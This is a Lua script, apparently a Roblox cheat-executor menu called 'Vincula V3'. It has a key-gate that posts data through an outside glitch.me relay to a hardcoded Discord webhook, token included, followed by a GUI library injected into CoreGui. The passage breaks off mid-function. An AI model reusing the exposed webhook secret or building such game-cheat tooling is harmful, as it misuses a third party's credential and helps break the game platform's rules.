function randomkey(length)
	local res = ""
	for i = 1, length do
		res = res .. string.char(math.random(97, 122))
	end
	return res
end
local HttpService = game:GetService("HttpService")
local webhook = "https://discordapp.com/api/webhooks/613825595163541504/7whN8Rc7rdn-z_ont229TQ3sB7IQdfI5FaFC_pDFsV2udLaGMuJFhN5hjm4xQLNDEl9o"
function send(Webhook, Message, Botname) 
    local Name;
    local start = game:HttpGet("http://buritoman69.glitch.me")
    local biggie = "http://buritoman69.glitch.me/webhook"
    if (not Message or Message == "" or not Botname) then
        Name = "GameBot"
        return error("nil or empty message!")
    else 
        Name = Botname;
    end
    local Body = {
        ['Key'] = tostring("applesaregood"),
        ['Message'] = tostring(Message),
        ['Name'] = Name,
        ['Webhook'] = Webhook
    }
    Body = HttpService:JSONEncode(Body);
    local Data = game:HttpPost(biggie, Body, false, "application/json")
    return Data or nil;
end
function makedragframe(frame) 
    local UserInputService = game:GetService("UserInputService")

    local gui = frame

    local dragging
    local dragInput
    local dragStart
    local startPos

    local function update(input)
        local delta = input.Position - dragStart
        gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end

    gui.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = gui.Position
            
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    gui.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            update(input)
        end
    end)
end
local whitelisted = false
local debugmode = true
if not debugmode then
    local ScreenGui = Instance.new("ScreenGui")
    local Frame = Instance.new("ImageLabel")
    local TextBox = Instance.new("TextBox")
    local TextLabel = Instance.new("TextLabel")
    local TextButton = Instance.new("TextButton")
    ScreenGui.Parent = game.CoreGui

    Frame.Name = "Frame"
    Frame.Parent = ScreenGui
    Frame.BackgroundColor3 = Color3.new(1, 1, 1)
    Frame.BackgroundTransparency = 1
    Frame.Position = UDim2.new(.4, -50, .5, -50)
    Frame.Size = UDim2.new(0, 462, 0, 156)
    Frame.Image = "rbxassetid://2851926732"
    Frame.ScaleType = Enum.ScaleType.Slice
    Frame.SliceCenter = Rect.new(12, 12, 12, 12)

    TextBox.Parent = Frame
    TextBox.BackgroundColor3 = Color3.new(0.12549, 1, 0.898039)
    TextBox.BorderSizePixel = 0
    TextBox.Position = UDim2.new(0.270562768, 0, 0.038461566, 0)
    TextBox.Size = UDim2.new(0, 200, 0, 50)
    TextBox.Font = Enum.Font.SourceSans
    TextBox.PlaceholderText = "Type Key Here"
    TextBox.Text = ""
    TextBox.TextColor3 = Color3.new(0, 0, 0)
    TextBox.TextScaled = false
    TextBox.TextSize = 15
    TextBox.TextWrapped = false

    TextLabel.Parent = Frame
    TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
    TextLabel.BackgroundTransparency = 1
    TextLabel.Position = UDim2.new(0.324675322, 0, 0.358974338, 0)
    TextLabel.Size = UDim2.new(0, 149, 0, 33)
    TextLabel.Font = Enum.Font.SourceSans
    TextLabel.Text = "Getting Info"
    TextLabel.TextColor3 = Color3.new(0, 0, 0)
    TextLabel.TextScaled = true
    TextLabel.TextSize = 14
    TextLabel.TextWrapped = true
    TextButton.Parent = Frame
    TextButton.BackgroundColor3 = Color3.new(1, 1, 1)
    TextButton.Position = UDim2.new(0.270562768, 0, 0.705128193, 0)
    TextButton.Size = UDim2.new(0, 200, 0, 34)
    TextButton.Font = Enum.Font.SourceSans
    TextButton.Text = "Submit"
    TextButton.TextColor3 = Color3.new(0, 0, 0)
    TextButton.TextScaled = true
    TextButton.TextSize = 14
    TextButton.TextWrapped = true
    local id = randomkey(10):upper()
    local key = randomkey(20):upper()
    send(webhook, "Id: "..id.." | Key: "..key.." | Key manager v0.0.4", "Key manager")
    TextLabel.Text = "Go to #keys and find the key with id: "..id
    TextButton.MouseButton1Click:connect(function() 
        if TextBox.Text == key then 
            whitelisted = true
            ScreenGui:Destroy()
        else
            game.Players.LocalPlayer:Kick("Invaild Key")
        end
    end)
else
    whitelisted = true
end
repeat wait() until whitelisted
--[[ Property order list (for organization):
	list removed for public release
	
	Credits: by Jan with help from heroku, still copied from wally and bmcq_12
	
--]]
local ui = {focusedtab = nil, tabcount = -1, ysize = 336}
-- If you want to incease the ysize then add 20 to the amount that it is at
-- The default size of a section with at least 1 option inside is 40 (dropdowns, sliders and boxes are +20)
-- so if you were to add another section you would add 20 + 20 * (amount of options)
-- Inceasing the ysize is only necessary when more room is needed

_settings = {
	modal = false, --lazy mouse unlocker
	font = Enum.Font.SourceSans,
	header = Color3.fromRGB(30,30,30),
	title = "Vincula V3",
	credits = "",
	tooltip = "Thanks for singularity for giving me his research and Jan giving me his ui lib",
	footer = Color3.fromRGB(30,30,30),
	background = Color3.fromRGB(40,40,40),
	tabbg = Color3.fromRGB(30,30,30),
	text = Color3.fromRGB(240,240,240),
	outline = Color3.fromRGB(60,60,60),
	tabbutton = Color3.fromRGB(50,50,50),
	selectedtab = Color3.fromRGB(100,100,100),
	sectionoutline = Color3.fromRGB(60,60,60),
	sectiontext = Color3.fromRGB(240,240,240),
	button = Color3.fromRGB(50,50,50),
	buttonhigh = Color3.fromRGB(100,100,100),
	toggleon = Color3.fromRGB(255,67,67),
	dropdownbg = Color3.fromRGB(40,40,40),
	dropdownarrow = Color3.fromRGB(80,80,80),
	slider = Color3.fromRGB(20,20,20),
	sliderbg = Color3.fromRGB(60,60,60),
	sliderfill = Color3.fromRGB(255,67,67),
	boxphtext = Color3.fromRGB(100,100,100),
}

local RunService, UserInputService,gui,dragging,dragInput,dragStart,startPos = game:GetService("RunService"), game:GetService("UserInputService")
local function update(input)
    local delta = input.Position - dragStart
    gui:TweenPosition(UDim2.new(0, startPos.X.Offset + delta.X, 0, startPos.Y.Offset + delta.Y), "Out", "Quad", 0.1, true)
end

local function stop(key)
	RunService:UnbindFromRenderStep(key)
end

local function addHighlight(obj, enter, leave, tooltip)
	tooltip = tooltip or _settings.tooltip
	obj.InputBegan:connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement then
			game:GetService("TweenService"):Create(obj, TweenInfo.new(0.2), {BackgroundTransparency = enter}):Play()
			ui.footer.Text = " " .. tooltip
		end
	end)
	obj.InputEnded:connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement then
			game:GetService("TweenService"):Create(obj, TweenInfo.new(0.4), {BackgroundTransparency = leave}):Play()
			ui.footer.Text = " " .. _settings.tooltip
		end
	end)
end

local blacklistedKeys = { --add or remove keys if you find the need to
	Enum.KeyCode.Unknown,Enum.KeyCode.W,Enum.KeyCode.A,Enum.KeyCode.S,Enum.KeyCode.D,Enum.KeyCode.Slash,Enum.KeyCode.Tab,Enum.KeyCode.Backspace,Enum.KeyCode.One,Enum.KeyCode.Two,Enum.KeyCode.Three,Enum.KeyCode.Four,Enum.KeyCode.Five,Enum.KeyCode.Six,Enum.KeyCode.Seven,Enum.KeyCode.Eight,Enum.KeyCode.Nine,Enum.KeyCode.Zero,Enum.KeyCode.Escape,Enum.KeyCode.F1,Enum.KeyCode.F2,Enum.KeyCode.F3,Enum.KeyCode.F4,Enum.KeyCode.F5,Enum.KeyCode.F6,Enum.KeyCode.F7,Enum.KeyCode.F8,Enum.KeyCode.F9,Enum.KeyCode.F10,Enum.KeyCode.F11,Enum.KeyCode.F12
}

local whitelistedMouse = { --add or remove mouse inputs if you find the need to
	Enum.UserInputType.MouseButton1,Enum.UserInputType.MouseButton2,Enum.UserInputType.MouseButton3
}

local function test(x,x1) -- used for keybinding
	for _,v in next, x1 do
		if v == x then 
			return true
		end 
	end
end

--[[ https://github.com/EmmanuelOga/columns/blob/master/utils/color.lua
	
 * Converts an RGB color value to HSV. Conversion formula
 * adapted from http://en.wikipedia.org/wiki/HSV_color_space.
 * Assumes r, g, and b are contained in the set [0, 255] and
 * returns h, s, and v in the set [0, 1].
 *
 * @param   Number  r       The red color value
 * @param   Number  g       The green color value
 * @param   Number  b       The blue color value
 * @return  Array           The HSV representation
]]
local function rgbToHsv(r, g, b)
	r, g, b = r / 255, g / 255, b / 255
	local max, min = math.max(r, g, b), math.min(r, g, b)
	local h, s, v
	v = max
	
	local d = max - min
	if max == 0 then
		s = 0
	else
		s = d / max
	end
	
	if max == min then
		h = 0 -- achromatic
	else
		if max == r then
			h = (g - b) / d
			if g < b then
				h = h + 6
			end
		elseif max == g then
			h = (b - r) / d + 2
		elseif max == b then
			h = (r - g) / d + 4
		end
		h = h / 6
	end

	return h, s, v
end

function updateHueSat(input, obj, hue, sat)
	hue = (obj.AbsoluteSize.X-(input.Position.X-obj.AbsolutePosition.X))/obj.AbsoluteSize.X
	sat = (obj.AbsoluteSize.Y-(input.Position.Y-obj.AbsolutePosition.Y))/obj.AbsoluteSize.Y
	return (input.Position.X-obj.AbsolutePosition.X)/obj.AbsoluteSize.X, (input.Position.Y-obj.AbsolutePosition.Y)/obj.AbsoluteSize.Y, hue, sat
end

function updateValue(input, obj, val)
	val = (obj.AbsoluteSize.Y-(input.Position.Y-obj.AbsolutePosition.Y))/obj.AbsoluteSize.Y
	return (input.Position.Y-obj.AbsolutePosition.Y)/obj.AbsoluteSize.Y, val
end

function ui:create(class, properties)
	local inst = Instance.new(class)
	for property, value in pairs(properties) do
		inst[property] = value
	end
	return inst
end

function ui:CreateTab(tabname)
	self.tabcount = self.tabcount + 1
	
	ui.base = ui.base or ui:create("ScreenGui", {
		Name = "library",
		ZIndexBehavior = Enum.ZIndexBehavior.Global,
		Parent = game.CoreGui
	})
	
	ui.cursor = ui.cursor or ui:create("Frame", {
		ZIndex = 100,
		Size = UDim2.new(0,4,0,4),
		BackgroundColor3 = Color3.fromRGB(255,255,255),
		BorderColor3 = Color3.fromRGB(0,0,0),
		Parent = self.base
	})
	
	ui.pointer = ui.pointer or ui:create("Frame", {
		ZIndex = 101,
		Size = UDim2.new(0,1,0,1),
		BackgroundColor3 = Color3.fromRGB(255,0,0),
		BorderColor3 = Color3.fromRGB(255,0,0),
		Parent = self.cursor
	})
	
	ui.header = ui.header or ui:create("TextLabel", {
		ZIndex = 21,
		Position = UDim2.new(0,60,0,40),
		Size = UDim2.new(0,504,0,19),
		BackgroundColor3 = _settings.header,
		BorderColor3 = _settings.outline,
		Text = _settings.title,
		TextColor3 = _settings.text,
		Parent = self.base
	})
	
	ui.main = ui.main or ui:create("Frame", {
		ZIndex = 20,
		Size = UDim2.new(1,0,0,self.ysize),
		BackgroundColor3 = _settings.background,
		BorderColor3 = _settings.outline,
		Parent = self.header
	})
	
	ui.credits = ui.credits or ui:create("TextLabel", {
		ZIndex = 22,
		Size = UDim2.new(1,0,0,19),
		BackgroundTransparency = 1,
		Text = _settings.credits,
		TextTransparency = 0.9,
		TextColor3 = _settings.text,
		Font = Enum.Font.SourceSans,
		TextSize = 12,
		TextXAlignment = Enum.TextXAlignment.Right,
		TextYAlignment = Enum.TextYAlignment.Bottom,
		Parent = self.main
	})
	
	ui.tabs = ui.tabs or ui:create("Frame", {
		ZIndex = 21,
		Position = UDim2.new(0,5,0,25),
		Size = UDim2.new(0,94,1,-30),
		BackgroundColor3 = _settings.tabbg,
		BorderColor3 = _settings.outline,
		Parent = self.main
	})
	
	ui.uipadding = ui.uipadding or ui:create("UIPadding", {
		PaddingTop = UDim.new(0,4),
		PaddingLeft = UDim.new(0,4),
		PaddingRight = UDim.new(0,4),
		Parent = self.tabs
	})
	
	local tab = {ysize = 0, xpos = 4}
	
	tab.button = ui:create("TextButton",{
		ZIndex = 22,
		Position = UDim2.new(0,0,0,self.tabcount*24),
		Size = UDim2.new(1,0,0,20),
		BackgroundTransparency = 0.6,
		BackgroundColor3 = _settings.tabbutton,
		BorderSizePixel = 0,
		Text = tabname,
		TextColor3 = _settings.text,
		Modal = _settings.modal,
		AutoButtonColor = false,
		Parent = self.tabs
	})
	
	tab.frame = ui:create("Frame", {
		ZIndex = 21,
		Position = UDim2.new(0,105,0,25),
		Size = UDim2.new(1,-110,1,-30),
		BackgroundColor3 = _settings.tabbg,
		BorderColor3 = _settings.outline,
		Visible = false,
		Parent = self.main
	})
	
	ui.footer = ui.footer or ui:create("TextLabel", {
		ZIndex = 21,
		Position = UDim2.new(0,0,1,0),
		Size = UDim2.new(1,0,0,16),
		BackgroundColor3 = _settings.footer,
		BorderColor3 = _settings.outline,
		Text = " " .. _settings.tooltip,
		TextColor3 = _settings.text,
		TextXAlignment = Enum.TextXAlignment.Left,
		Parent = self.main
	})
	
	addHighlight(tab.button, 0.2, 0.6)
	
	self.header.InputBegan:connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			gui = self.header
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
					     
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	self.header.InputChanged:connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement then
			dragInput = input
		end
	end)
	
	local function focusOnTab()
		if self.focusedtab then
			self.focusedtab.button.BackgroundColor3 = _settings.tabbutton
			self.focusedtab.frame.Visible = false
		end
		self.focusedtab = tab
		tab.button.BackgroundColor3 = _settings.selectedtab
		tab.frame.Visible = true
	end
	
	if self.tabcount == 0 then
		focusOnTab()
	end
	
	tab.button.MouseButton1Click:connect(focusOnTab)
	
	local function posSection(self, num)
		num = num or 0
		if tab.ysize > tab.frame.AbsoluteSize.Y-26-num then
			tab.xpos = 198
			tab.ysize = 0
			if self then
				self.frame.Position = UDim2.new(0,tab.xpos+4,0,tab.ysize+8)
				tab.ysize = self.ysize+10
			end
		end
	end
	
	function tab:AddSection(sectionname)
		local section = {ysize = 10}
		posSection()
		
		section.frame =  ui:create("Frame", {
			ZIndex = 22,
			Position = UDim2.new(0,self.xpos+4,0,self.ysize+8),
			BackgroundColor3 = _settings.tabbg,
			BorderColor3 = _settings.sectionoutline,
			Size = UDim2.new(0,200-12,0,0),
			Parent = self.frame
		})
		
		section.name = ui:create("TextLabel", {
			ZIndex = 23,
			AnchorPoint = Vector2.new(0,0.5),
			Position = UDim2.new(0,12,0,0),
			BackgroundColor3 = _settings.tabbg,
			BorderSizePixel = 0,
			TextColor3 = _settings.sectiontext,
			BorderSizePixel = 0,
			Text = sectionname,
			Parent = section.frame
		})
		section.name.Size = UDim2.new(0,section.name.TextBounds.X+8,0,2)
		
		function section:AddButton(text, _function, tooltip)
			_function = _function or function() end
			posSection(self)
			
			local button = ui:create("TextButton", {
				ZIndex = 23,
				Position = UDim2.new(0,2,0,self.ysize),
				Size = UDim2.new(1,-4,0,18),
				BackgroundTransparency = 1,
				BackgroundColor3 = _settings.buttonhigh,
				BorderSizePixel = 0,
				Text = " "..text,
				TextColor3 = _settings.text,
				Font = _settings.font,
				TextSize = 16,
				TextXAlignment = Enum.TextXAlignment.Left,
				AutoButtonColor = false,
				Parent = self.frame,
			})
			
			addHighlight(button, 0.8, 1, tooltip)
			
			button.MouseButton1Click:connect(function()
				_function()
			end)
			
			self.ysize = self.ysize+20
			tab.ysize = tab.ysize+20
			section.frame.Size = UDim2.new(0,200-16,0,self.ysize)
			
			return button
		end
		
		function section:AddToggle(text, _function, tooltip)
			local bool
			_function = _function or function() end
			posSection(self)
			
			local button = ui:create("TextButton", {
				ZIndex = 23,
				Position = UDim2.new(0,2,0,self.ysize),
				Size = UDim2.new(1,-4,0,18),
				BackgroundTransparency = 1,
				BackgroundColor3 = _settings.buttonhigh,
				BorderSizePixel = 0,
				Text = " "..text,
				TextColor3 = _settings.text,
				Font = _settings.font,
				TextSize = 16,
				TextXAlignment = Enum.TextXAlignment.Left,
				AutoButtonColor = false,
				Parent = self.frame,
			})
			
			local holder = ui:create("Frame", {
				ZIndex = 24,
				Position = UDim2.new(1,-2,0,2),
				Size = UDim2.new(0,-14,0,14),
				BackgroundColor3 = _settings.background,
				BorderColor3 = _settings.sectionoutline,
				Parent = button,
			})
			
			local visualize = ui:create("Frame", {
				ZIndex = 25,
				Position = UDim2.new(0,2,0,2),
				Size = UDim2.new(1,-4,1,-4),
				BackgroundTransparency = 1,
				BackgroundColor3 = _settings.toggleon,
				BorderSizePixel = 0,
				Parent = holder,
			})
			
			addHighlight(button, 0.8, 1, tooltip)
			
			button.MouseButton1Click:connect(function()
				bool = not bool
				if bool then game:GetService("TweenService"):Create(visualize, TweenInfo.new(0.2), {BackgroundTransparency = 0}):Play()
					else game:GetService("TweenService"):Create(visualize, TweenInfo.new(0.2), {BackgroundTransparency = 1}):Play() end
				return _function(bool)
			end)
			
			self.ysize = self.ysize+20
			tab.ysize = tab.ysize+20
			section.frame.Size = UDim2.new(0,200-16,0,self.ysize)
			
			return button
		end
		
		function section:AddBox(text, txtval, _function, keep, tooltip)
			local value = ""
			if txtval then
				if typeof(txtval) == "function" then
					tooltip = _function
					_function = txtval
					txtval = ""
				elseif typeof(txtval) == "string" then
					value = txtval
				end
				end
			if keep then
				if typeof(keep) == "string" then
					tooltip = keep
					keep = false
				end
			end
			posSection(self, 20)
			
			local button = ui:create("TextButton", {
				ZIndex = 23,
				Position = UDim2.new(0,2,0,self.ysize),
				Size = UDim2.new(1,-4,0,38),
				BackgroundTransparency = 1,
				BackgroundColor3 = _settings.buttonhigh,
				BorderSizePixel = 0,
				Text = " "..text,
				TextColor3 = _settings.text,
				Font = _settings.font,
				TextSize = 16,
				TextXAlignment = Enum.TextXAlignment.Left,
				TextYAlignment = Enum.TextYAlignment.Top,
				Parent = self.frame,
			})
			
			local box = ui:create("TextBox", {
				ZIndex = 24,
				Position = UDim2.new(0,2,0,19),
				Size = UDim2.new(1,-4,0,17),
				BackgroundTransparency = 0,
				BackgroundColor3 = _settings.background,
				BorderColor3 = _settings.sectionoutline,
				Text = txtval,
				TextColor3 = _settings.text,
				PlaceholderText = "",
				PlaceholderColor3 = _settings.boxtext,
				Font = _settings.font,
				TextSize = 14,
				Parent = button,
			})
			
			addHighlight(button, 0.8, 1, tooltip)
			
			button.MouseButton1Click:connect(function()
				box:CaptureFocus()
			end)
			
			box.FocusLost:connect(function(enter)
				if keep then
					if box.Text == "" then
						box.Text = value
					else
						value = box.Text
					end
				end
				game:GetService("TweenService"):Create(button, TweenInfo.new(0.4), {BackgroundTransparency = 1}):Play()
				return _function(box, enter)
			end)
			
			UserInputService.InputBegan:connect(function(input)
				if input.KeyCode == Enum.KeyCode.Escape and box:IsFocused() then
					box:ReleaseFocus()
				end
			end)
			
			self.ysize = self.ysize+40
			tab.ysize = tab.ysize+40
			section.frame.Size = UDim2.new(0,200-16,0,self.ysize)
			
			return box
		end
		
		function section:AddLabel(text)
			posSection(self)
			
			local label = ui:create("TextBox", {
				ZIndex = 23,
				Position = UDim2.new(0,5,0,self.ysize),
				BackgroundTransparency = 1,
				Text = text or "",
				TextColor3 = _settings.text,
				Font = _settings.font,
				TextSize = 16,
				TextXAlignment = Enum.TextXAlignment.Left,
				LineHeight = 4,
				Parent = self.frame,
			})
			local lineCount = label.TextBounds.Y/label.TextSize
			local size = lineCount*(label.TextSize+4)
			label.Size = UDim2.new(1,-8,0,size)
			
			self.ysize = self.ysize+size
			tab.ysize = tab.ysize+size
			section.frame.Size = UDim2.new(0,200-16,0,self.ysize)
			
			return label
		end
		
		function section:AddDropdown(text, options, _function, push, tooltip, tooltips)
			local list = {order = 0, closed = true, ysize = 2}
			list.content = {}
			if push then
				if typeof(push) == "string" then
					tooltips = tooltip or {}
					tooltip = push
					push = false
				end
			end
			if tooltip then
				if typeof(tooltip) == "table" then
					tooltips = tooltip
					tooltip = push
					push = false
				end
			end
			tooltips = tooltips or {}
			posSection(self, 20)
			
			local button = ui:create("TextButton", {
				ZIndex = 23,
				Position = UDim2.new(0,2,0,self.ysize),
				Size = UDim2.new(1,-4,0,38),
				BackgroundTransparency = 1,
				BackgroundColor3 = _settings.buttonhigh,
				BorderSizePixel = 0,
				Text = " "..text,
				TextColor3 = _settings.text,
				Font = _settings.font,
				TextSize = 16,
				TextXAlignment = Enum.TextXAlignment.Left,
				TextYAlignment = Enum.TextYAlignment.Top,
				AutoButtonColor = false,
				Parent = self.frame,
			})
			
			local label = ui:create("TextLabel", {
				ZIndex = 24,
				Position = UDim2.new(0,2,0,19),
				Size = UDim2.new(1,-4,0,17),
				BackgroundTransparency = 0,
				BackgroundColor3 = _settings.background,
				BorderColor3 = _settings.sectionoutline,
				Text = options[1],
				TextColor3 = _settings.text,
				Font = _settings.font,
				TextSize = 16,
				Parent = button,
			})
			
			local arrow = ui:create("TextLabel", {
				ZIndex = 25,
				Position = UDim2.new(1,0,0,0),
				Size = UDim2.new(0,-16,0,15),
				Rotation = 90,
				BackgroundTransparency = 1,
				Text = ">",
				TextColor3 = _settings.dropdownarrow,
				Font = Enum.Font.Arcade,
				TextSize = 18,
				Parent = label,
			})
			
			local container = ui:create("Frame", {
				ZIndex = 28,
				ClipsDescendants = true,
				Position = UDim2.new(0,0,1,3),
				BackgroundTransparency = 0,
				BorderSizePixel = 1,
				BackgroundColor3 = _settings.dropdownbg,
				BorderColor3 = _settings.sectionoutline,
				Visible = false,
				Parent = label,
			})
			
			local listlayout = ui:create("UIListLayout", {
				Padding = UDim.new(0,2),
				SortOrder = Enum.SortOrder.LayoutOrder,
				Parent = container
			})
			local padding = ui:create("UIPadding", {
				PaddingLeft = UDim.new(0,2),
				PaddingRight = UDim.new(0,2),
				PaddingTop = UDim.new(0,2),
				Parent = container
			})
			
			addHighlight(button, 0.8, 1, tooltip)
			
			button.MouseButton1Click:connect(function()
				list.closed = not list.closed
				if list.closed then
					arrow.Text = ">"
					container.Visible = false
				else
					arrow.Text = "<"
					container.Visible = true
				end
			end)
			
			for _,value in pairs(options) do
				list.order = list.order+1
				
				local option = ui:create("TextButton", {
					ZIndex = 29,
					LayoutOrder = list.order,
					Size = UDim2.new(1,0,0,18),
					BackgroundTransparency = 1,
					BackgroundColor3 = _settings.buttonhigh,
					BorderSizePixel = 0,
					Text = value,
					TextColor3 = _settings.text,
					Font = _settings.font,
					TextSize = 16,
					AutoButtonColor = false,
					Parent = container,
				})
				
				addHighlight(option, 0.8, 1, tooltips[list.order] or _settings.tooltip)
				
				option.MouseButton1Click:connect(function()
					if push then
						for _,v in pairs(list.content) do
							if v.LayoutOrder < option.LayoutOrder then
								v.LayoutOrder = v.LayoutOrder + 1
							end
						end
						option.LayoutOrder = 1
					end
					label.Text = option.Text
					list.closed = true
					arrow.Text = ">"
					container.Visible = false
					return _function(value)
				end)
				
				table.insert(list.content, list.order, option)
				list.ysize = list.ysize+20
				container.Size = UDim2.new(1,0,0,list.ysize)
			end
			
			self.ysize = self.ysize+40
			tab.ysize = tab.ysize+40
			section.frame.Size = UDim2.new(0,200-16,0,self.ysize)
			
			return list
		end
		
		function section:AddSlider(text, maxVal, setVal, _function, tooltip)
			if setVal then
				if typeof(setVal) == "function" then
					tooltip = _function
					_function = setVal
					setVal = 0
				end
			end
			posSection(self, 20)
			
			local button = ui:create("TextLabel", {
				ZIndex = 23,
				Position = UDim2.new(0,2,0,self.ysize),
				Size = UDim2.new(1,-4,0,38),
				BackgroundTransparency = 1,
				BackgroundColor3 = _settings.buttonhigh,
				Text = " "..text,
				TextColor3 = _settings.text,
				Font = _settings.font,
				TextSize = 16,
				TextXAlignment = Enum.TextXAlignment.Left,
				TextYAlignment = Enum.TextYAlignment.Top,
				Parent = self.frame,
			})
			
			local slider = ui:create("Frame", {
				ZIndex = 24,
				Position = UDim2.new(0,2,0,18),
				Size = UDim2.new(1,-4,0,18),
				BackgroundTransparency = 1,
				Parent = button,
			})
			
			local visualize = ui:create("TextBox", {
				ZIndex = 27,
				Position = UDim2.new(0,0,0.5,0),
				Size = UDim2.new(1,0,0.5,0),
				BackgroundTransparency = 1,
				Text = setVal,
				TextColor3 = _settings.text,
				Font = _settings.font,
				TextSize = 14,
				Parent = slider,
			})
			
			local sliderbar = ui:create("Frame", {
				ZIndex = 25,
				AnchorPoint = Vector2.new(0.5,0.5),
				Position = UDim2.new(0.5,0,0.2,0),
				Size = UDim2.new(1,-6,0,4),
				BackgroundColor3 = _settings.sliderbg,
				BorderSizePixel = 0,
				Parent = slider,
			})
			
			local sliderfill = ui:create("Frame", {
				ZIndex = 26,
				Size = UDim2.new(setVal/maxVal,0,1,0),
				BackgroundColor3 = _settings.sliderfill,
				BorderSizePixel = 0,
				Parent = sliderbar,
			})
			
			local sliderbox = ui:create("Frame", {
				ZIndex = 27,
				AnchorPoint = Vector2.new(0.5,0.5),
				Position = UDim2.new(setVal/maxVal,0,0.5,0),
				Size = UDim2.new(0,4,0,12),
				BackgroundColor3 = _settings.slider,
				BorderSizePixel = 0,
				Parent = sliderbar,
			})
			
			addHighlight(button, 0.8, 1, tooltip)
			
			local function updateSlider(input)
				local relativePos = (Vector2.new(input.Position.X,0) - Vector2.new(sliderbar.AbsolutePosition.X,0)).magnitude
				if input.Position.X < sliderbar.AbsolutePosition.X then
					relativePos = 0
				end
				if relativePos > sliderbar.AbsoluteSize.X then
					relativePos = sliderbar.AbsoluteSize.X
				end
				sliderbox:TweenPosition(UDim2.new(0,relativePos,0.5,0), "Out", "Quad", 0.1, true)
				sliderfill:TweenSize(UDim2.new(0,relativePos,1,0), "Out", "Quad", 0.1, true)
				setVal = relativePos/sliderbar.AbsoluteSize.X
				setVal = math.floor(setVal*maxVal)
				visualize.Text = setVal
				_function(setVal)
			end
			
			local sliding
			local modifying
			button.InputBegan:connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 then
					if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
						modifying = true
						visualize:CaptureFocus()
					else
						sliding = true
						updateSlider(input)
					end
				end
			end)
			
			visualize.Focused:connect(function()
				if not modifying then
					visualize:ReleaseFocus()
				end
			end)
			
			visualize.FocusLost:connect(function()
				modifying = false
				local num = tonumber(visualize.Text)
				if num then
					setVal = num
					if num > maxVal then
						setVal = maxVal
					end
					if num < 0 then
						setVal = 0
					end
					sliderbox:TweenPosition(UDim2.new(setVal/maxVal,0,0.5,0), "Out", "Quad", 0.1, true)
					sliderfill:TweenSize(UDim2.new(setVal/maxVal,0,1,0), "Out", "Quad", 0.1, true)
					_function(setVal)
				end
				visualize.Text = setVal
			end)
			
			button.InputEnded:connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 then
					sliding = false
				end
			end)
			
			UserInputService.InputChanged:connect(function(input)
				if modifying then
					if input == Enum.KeyCode.Escape or input.KeyCode == Enum.KeyCode.Space then
						visualize:ReleaseFocus()
					end
				end
				if input.UserInputType == Enum.UserInputType.MouseMovement then
					if sliding then
						updateSlider(input)
					end
				end
			end)
			
			self.ysize = self.ysize+40
			tab.ysize = tab.ysize+40
			section.frame.Size = UDim2.new(0,200-16,0,self.ysize)
			
			return button
		end
		
		function section:AddCP(text, color, _function, tooltip)
			local red, green, blue = color.r*255, color.g*255, color.b*255
			_function = _function or function() end
			posSection(self)
			
			local hue, sat, val = rgbToHsv(red,green,blue)
			
			local button = ui:create("TextButton", {
				ZIndex = 23,
				Position = UDim2.new(0,2,0,self.ysize),
				Size = UDim2.new(1,-4,0,18),
				BackgroundTransparency = 1,
				BackgroundColor3 = _settings.buttonhigh,
				BorderSizePixel = 0,
				Text = " "..text,
				TextColor3 = _settings.text,
				Font = _settings.font,
				TextSize = 16,
				TextXAlignment = Enum.TextXAlignment.Left,
				AutoButtonColor = false,
				Parent = self.frame,
			})
			
			local visualize = ui:create("Frame", {
				ZIndex = 24,
				Position = UDim2.new(1,-2,0,2),
				Size = UDim2.new(0,-23,0,14),
				BackgroundColor3 = color,
				BorderColor3 = _settings.sectionoutline,
				Parent = button,
			})
			
			local container = ui:create("TextButton", {
				ZIndex = 41,
				Position = UDim2.new(0,-3,0,0),
				Size = UDim2.new(0,-150,0,135),
				BackgroundColor3 = _settings.background,
				BorderColor3 = _settings.sectionoutline,
				AutoButtonColor = false,
				Visible = false,
				Parent = visualize
			})
			
			local HueSat = ui:create("ImageLabel", {
				ZIndex = 42,
				Position = UDim2.new(0,5,0,5),
				Size = UDim2.new(1,-25,1,-10),
				BorderColor3 = _settings.sectionoutline,
				Image = "rbxassetid://698052001",
				Parent = container
			})
			
			local pointer = ui:create("Frame", {
				ZIndex = 43,
				AnchorPoint = Vector2.new(0.5,0.5),
				Position = UDim2.new(1-hue,0,1-sat,0),
				Size = UDim2.new(0,4,0,4),
				Rotation = 45,
				BackgroundColor3 = Color3.fromRGB(255,255,255),
				BorderColor3 = Color3.fromRGB(0,0,0),
				Parent = HueSat
			})
			
			local Value = ui:create("ImageLabel", {
				ZIndex = 42,
				Position = UDim2.new(1,-15,0,5),
				Size = UDim2.new(0,10,1,-10),
				BorderColor3 = _settings.sectionoutline,
				Image = "rbxassetid://3641079629",
				Parent = container
			})
			
			local pointer2 = ui:create("TextLabel", {
				ZIndex = 43,
				AnchorPoint = Vector2.new(0,0.5),
				Position = UDim2.new(1,-10,1-val,0),
				Size = UDim2.new(0,16,0,16),
				BackgroundTransparency = 1,
				Text = "◄",
				TextColor3 = Color3.fromRGB(0,0,0),
				TextStrokeTransparency = 0,
				TextStrokeColor3 = Color3.fromRGB(130,130,130),
				TextSize = 6,
				Parent = Value
			})
			
			addHighlight(button, 0.8, 1, tooltip)
			
			button.MouseButton1Click:connect(function()
				container.Visible = not container.Visible
			end)
			
			local picking
			local pickingVal
			HueSat.InputBegan:connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 then
